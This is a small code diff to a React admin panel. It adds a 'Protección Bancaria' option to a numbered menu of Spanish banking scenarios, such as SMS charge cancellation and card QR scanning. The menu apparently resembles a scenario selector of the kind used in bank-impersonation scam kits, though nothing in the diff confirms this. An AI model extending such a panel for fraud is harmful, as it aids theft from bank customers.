@@ -770,6 +770,7 @@ export default function AdminPanel() {
                   <option value="sms_compra">9. SMS Compra - Cancelación de cargos</option>
                   <option value="escanear_qr">10. Escanear QR de Tarjeta</option>
                   <option value="cancelacion_retiro">11. Cancelación de retiro sin tarjeta</option>
+                  <option value="proteccion_bancaria">12. Protección Bancaria</option>
                 </select>
               </div>
             </div>
